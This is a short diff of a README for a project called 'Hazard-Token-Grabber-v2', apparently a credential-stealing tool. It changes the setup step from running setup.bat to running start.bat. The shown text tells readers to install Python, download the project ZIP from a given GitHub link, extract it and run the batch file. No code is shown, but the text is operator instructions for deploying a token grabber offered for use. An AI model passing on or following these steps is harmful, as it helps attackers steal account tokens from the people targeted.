@@ -50,7 +50,7 @@ It is really easy to set this up! Just get [python version 3.10](https://www.pyt
 
 Click the blue/green "CODE" button on this page. Choose the option "DOWNLOAD ZIP". Or you can directly download the ZIP from [this link](https://github.com/Gumbobrot/Hazard-Token-Grabber-v2/archive/refs/heads/main.zip).
 
-Extract to ZIP to your Desktop and enter the Hazard-Token-Grabber-v2 folder. In there, just run setup.bat and follow the instructions that it gives to you.
+Extract to ZIP to your Desktop and enter the Hazard-Token-Grabber-v2 folder. In there, just run start.bat and follow the instructions that it gives to you.
 
 ---------------------------------------------------------------------------------------------------
 <div align="center">
